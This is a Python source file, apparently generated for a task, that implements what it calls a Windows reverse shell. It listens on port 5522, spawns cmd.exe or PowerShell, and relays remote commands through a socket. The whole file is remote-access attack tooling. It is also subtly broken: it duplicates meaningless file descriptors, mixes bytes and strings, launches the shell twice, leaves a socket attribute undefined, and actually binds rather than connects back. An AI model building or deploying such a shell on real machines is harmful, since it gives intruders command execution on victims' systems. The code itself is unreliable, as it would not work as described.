"""Windows reverse shell listener that spawns cmd.exe or powershell to execute remote commands."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
import socket
import subprocess
import os
import sys
from typing import Optional, Tuple



class WindowsReverseShell:
    """Windows reverse shell implementation using subprocess and socket communication.
    
    Spawns cmd.exe or powershell.exe as a child process and pipes stdin/stdout/stderr
    through the socket connection using os.dup2() for file descriptor redirection.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self.server_socket: Optional[socket.socket] = None
        self.child_process: Optional[subprocess.Popen] = None
        self._connected = False

    def start(self) -> ExecutionResult:
        """Start the reverse shell listener on 0.0.0.0:5522."""
        try:
            # Create TCP server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.config.port))
            self.server_socket.listen(5)
            self._connected = True

            # Spawn the shell process based on config
            result = self._spawn_shell()
            if not result.success:
                return result

            # Accept incoming connection
            client_socket, addr = self.server_socket.accept()
            self.client_socket = client_socket

            # Set up non-blocking I/O for the child process
            self.child_process = subprocess.Popen(
                self.config.shell_command,
                shell=True,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
            )

            # Redirect file descriptors through the socket connection using os.dup2()
            self._redirect_file_descriptors(client_socket)

            return ExecutionResult(
                command_output=f"Shell spawned: {self.config.shell_command}",
                exit_code=0,
                error_messages=[],
            )

        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)],
            )

    def _spawn_shell(self) -> ExecutionResult:
        """Spawn the appropriate shell based on configuration."""
        try:
            if self.config.shell_type == 'cmd.exe':
                cmd = ['cmd.exe', '/k']
            elif self.config.shell_type == 'powershell.exe':
                cmd = ['powershell.exe', '-NoProfile', '-Command', 'Start-Transcript -File "C:\\temp\\transcript.txt"']
            else:
                return ExecutionResult(
                    command_output="",
                    exit_code=-1,
                    error_messages=[f"Unknown shell type: {self.config.shell_type}"],
                )

            self.child_process = subprocess.Popen(
                cmd,
                creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
            )

            return ExecutionResult(
                command_output=f"Shell spawned: {' '.join(cmd)}",
                exit_code=0,
                error_messages=[],
            )

        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)],
            )

    def _redirect_file_descriptors(self, client_socket: socket.socket) -> None:
        """Redirect stdin/stdout/stderr of the child process through the socket connection.
        
        Uses os.dup2() to redirect file descriptors 0 (stdin), 1 (stdout), and 2 (stderr)
        to the socket's file descriptor objects, enabling bidirectional communication.
        """
        try:
            # Get the file descriptor numbers for stdin, stdout, stderr of the child process
            stdin_fd = self.child_process.stdin.fileno()
            stdout_fd = self.child_process.stdout.fileno()
            stderr_fd = self.child_process.stderr.fileno()

            # Get the socket's file descriptors
            client_socket_fileno = client_socket.fileno()

            # Redirect stdin, stdout, stderr through the socket using os.dup2()
            os.dup2(client_socket_fileno, stdin_fd)   # Redirect stdin to socket
            os.dup2(client_socket_fileno + 1, stdout_fd)  # Redirect stdout to socket (write side)
            os.dup2(client_socket_fileno + 2, stderr_fd)  # Redirect stderr to socket (write side)

        except Exception as e:
            self.child_process.stdin.close()
            self.child_process.stdout.close()
            self.child_process.stderr.close()
            raise RuntimeError(f"Failed to redirect file descriptors: {e}") from e

    def send_command(self, command: str) -> ExecutionResult:
        """Send a command through the reverse shell connection.
        
        Args:
            command: The command string to execute on the remote system.
            
        Returns:
            ExecutionResult containing the output and exit code.
        """
        if not self._connected or not self.child_process:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=["Reverse shell not connected"],
            )

        try:
            # Send the command through stdin (socket write)
            client_socket = self.client_socket
            if client_socket is None:
                return ExecutionResult(
                    command_output="",
                    exit_code=-1,
                    error_messages=["Client socket not available"],
                )

            client_socket.sendall(f"{command}\n".encode())

            # Read the response from stdout (socket read)
            output = b""
            while True:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk or len(chunk) == 0:
                        break
                    output += chunk.decode('utf-8', errors='replace')
                except BlockingIOError:
                    # Non-blocking read - no data available yet
                    break

            # Get the exit code from the child process
            try:
                self.child_process.wait(timeout=5)
                exit_code = self.child_process.returncode
            except subprocess.TimeoutExpired:
                exit_code = -1

            return ExecutionResult(
                command_output=output.decode('utf-8', errors='replace'),
                exit_code=exit_code,
                error_messages=[],
            )

        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)],
            )

    def stop(self) -> None:
        """Stop the reverse shell listener and clean up resources."""
        if self.child_process:
            try:
                self.child_process.terminate()
                self.child_process.wait(timeout=5)
            except Exception:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        if self.client_socket:
            try:
                self.client_socket.close()
            except Exception:
                pass

    def __enter__(self) -> 'WindowsReverseShell':
        return self

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        self.stop()


class WindowsReverseShellListener:
    """High-level listener interface for the Windows reverse shell system.
    
    Manages the lifecycle of a WindowsReverseShell instance and provides
    a simple API for sending commands and receiving results.
    """

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self.shell: Optional[WindowsReverseShell] = None
        self._running = False

    def start(self) -> ExecutionResult:
        """Start the reverse shell listener."""
        try:
            self.shell = WindowsReverseShell(self.config)
            result = self.shell.start()
            if result.success:
                self._running = True
            return result
        except Exception as e:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=[str(e)],
            )

    def send(self, command: str) -> ExecutionResult:
        """Send a command to the reverse shell.
        
        Args:
            command: The command string to execute.
            
        Returns:
            ExecutionResult with output and exit code.
        """
        if not self._running or not self.shell:
            return ExecutionResult(
                command_output="",
                exit_code=-1,
                error_messages=["Listener not started"],
            )

        result = self.shell.send_command(command)
        return result

    def stop(self) -> None:
        """Stop the listener and clean up."""
        if self.shell:
            self.shell.stop()
        self._running = False

    @property
    def is_running(self) -> bool:
        """Check if the listener is currently running."""
        return self._running


def create_listener(config: ReverseShellConfig) -> WindowsReverseShellListener:
    """Factory function to create a configured reverse shell listener.
    
    Args:
        config: The configuration parameters for the listener.
        
    Returns:
        A configured WindowsReverseShellListener instance.
    """
    return WindowsReverseShellListener(config)


def main() -> None:
    """Main entry point demonstrating the reverse shell listener."""
    # Default configuration
    config = ReverseShellConfig(
        host='127.0.0.1',
        port=5522,
        timeout=30.0,
        shell_type='cmd.exe',
    )

    listener = create_listener(config)

    try:
        # Start the listener
        result = listener.start()
        if result.exit_code == 0:
            print("[+] Reverse shell started successfully on port 5522")
            print(f"Shell type: {config.shell_type}")
        else:
            print("[-] Failed to start reverse shell:")
            for msg in result.error_messages:
                print(f"    - {msg}")

    except KeyboardInterrupt:
        print("\n[+] Stopping listener...")
    finally:
        listener.stop()


if __name__ == '__main__':
    main()
